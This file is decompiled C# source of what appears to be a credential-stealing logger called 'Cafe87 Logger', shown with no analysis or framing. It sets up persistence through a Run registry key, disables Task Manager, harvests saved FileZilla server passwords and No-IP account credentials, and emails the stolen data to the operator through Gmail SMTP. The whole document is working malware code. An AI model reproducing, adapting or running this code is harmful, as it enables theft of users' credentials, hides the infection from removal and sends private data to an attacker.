using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Stubich;

public class ozllk
{
	private string string_0;

	public ozllk()
	{
		Class7.wu3uG8qzm2R30();
		base._002Ector();
		string_0 = Path.GetFileName(Application.get_ExecutablePath());
	}

	public static object Baslat()
	{
		string fileName = Path.GetFileName(Application.get_ExecutablePath());
		Copy();
		Thread.Sleep(500);
		NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", "")))), (Type)null, "regwrite", new object[2]
		{
			"HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\" + fileName,
			Interaction.Environ("appdata") + "\\" + fileName
		}, (string[])null, (Type[])null, (bool[])null, true);
		object result = default(object);
		return result;
	}

	public static object Copy()
	{
		try
		{
			string fileName = Path.GetFileName(Application.get_ExecutablePath());
			((ServerComputer)Class2.Class1_0).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Interaction.Environ("appdata") + "\\" + fileName);
			Process.Start(Interaction.Environ("appdata") + fileName);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int num = default(int);
		return num;
	}

	public static object Filezilla()
	{
		((TextBoxBase)Class2.wiWtuWdmw.Form1.vmethod_10()).Clear();
		((TextBoxBase)Class2.wiWtuWdmw.Form1.vmethod_12()).Clear();
		object result = default(object);
		try
		{
			Class2.wiWtuWdmw.Form1.vmethod_10().LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml", (RichTextBoxStreamType)1);
			TextBox val = Class2.wiWtuWdmw.Form1.vmethod_0();
			val.set_Text(val.get_Text() + "FileZilla Infomation: \r\n====================================\r\n");
			string[] lines = ((TextBoxBase)Class2.wiWtuWdmw.Form1.vmethod_10()).get_Lines();
			foreach (string text in lines)
			{
				if (text.Contains("<Host>"))
				{
					val = Class2.wiWtuWdmw.Form1.vmethod_0();
					val.set_Text(val.get_Text() + "Host: " + text.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + "\r\n");
				}
				if (text.Contains("<Port>"))
				{
					val = Class2.wiWtuWdmw.Form1.vmethod_0();
					val.set_Text(val.get_Text() + "Port: " + text.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + "\r\n");
				}
				if (text.Contains("<User>"))
				{
					val = Class2.wiWtuWdmw.Form1.vmethod_0();
					val.set_Text(val.get_Text() + "User: " + text.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + "\r\n");
				}
				if (text.Contains("<Pass>"))
				{
					val = Class2.wiWtuWdmw.Form1.vmethod_0();
					val.set_Text(val.get_Text() + "Passwort: " + text.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + "\r\n====================================\r\n");
				}
			}
			Class2.wiWtuWdmw.Form1.vmethod_10().LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml", (RichTextBoxStreamType)1);
			val = Class2.wiWtuWdmw.Form1.vmethod_0();
			val.set_Text(val.get_Text() + "\r\n\r\nDump of Servermanegers: \r\n\r\n====================================\r\n");
			string[] lines2 = ((TextBoxBase)Class2.wiWtuWdmw.Form1.vmethod_10()).get_Lines();
			foreach (string text2 in lines2)
			{
				if (text2.Contains("<Host>"))
				{
					val = Class2.wiWtuWdmw.Form1.vmethod_0();
					val.set_Text(val.get_Text() + "Host: " + text2.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + "\r\n");
				}
				if (text2.Contains("<Port>"))
				{
					val = Class2.wiWtuWdmw.Form1.vmethod_0();
					val.set_Text(val.get_Text() + "Port: " + text2.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + "\r\n");
				}
				if (text2.Contains("<User>"))
				{
					val = Class2.wiWtuWdmw.Form1.vmethod_0();
					val.set_Text(val.get_Text() + "User: " + text2.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + "\r\n");
				}
				if (text2.Contains("<Pass>"))
				{
					val = Class2.wiWtuWdmw.Form1.vmethod_0();
					val.set_Text(val.get_Text() + "Passwort: " + text2.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + "\r\n====================================\r\n");
				}
			}
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object GorevSik()
	{
		((ServerComputer)Class2.Class1_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
		object result = default(object);
		return result;
	}

	public static object smethod_0()
	{
		string text = Conversions.ToString(RuntimeHelpers.GetObjectValue(((ServerComputer)Class2.Class1_0).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Vitalwerks\\DUC", "Username", (object)null)));
		string text2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(((ServerComputer)Class2.Class1_0).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Vitalwerks\\DUC", "Password", (object)null)));
		Class2.wiWtuWdmw.Form1.vmethod_14().set_Text("No İp Kullanıcı Adı :   " + text + "No İp Kullanıcı Şifresi :   " + text2);
		object result = default(object);
		return result;
	}

	public static object Sifre()
	{
		return 0;
	}

	public static object yolla()
	{
		if (Operators.CompareString(Class2.wiWtuWdmw.Form1.vmethod_0().get_Text(), "", false) != 0)
		{
			SmtpClient smtpClient = new SmtpClient();
			MailMessage mailMessage = new MailMessage();
			smtpClient.Credentials = new NetworkCredential(Class2.wiWtuWdmw.Form1.vmethod_4().get_Text(), Class2.wiWtuWdmw.Form1.vmethod_6().get_Text());
			smtpClient.Port = Conversions.ToInteger("587");
			smtpClient.Host = "smtp.gmail.com";
			smtpClient.EnableSsl = true;
			mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(Class2.wiWtuWdmw.Form1.vmethod_4().get_Text());
			mailMessage.To.Add(Class2.wiWtuWdmw.Form1.vmethod_4().get_Text());
			mailMessage.Subject = "Cafe87 Logger | Loglar Geldi";
			mailMessage.IsBodyHtml = true;
			mailMessage.Body = "<Center><B>" + Class2.wiWtuWdmw.Form1.vmethod_0().get_Text() + "</CENTER></B>";
			smtpClient.Send(mailMessage);
		}
		int num = default(int);
		return num;
	}
}
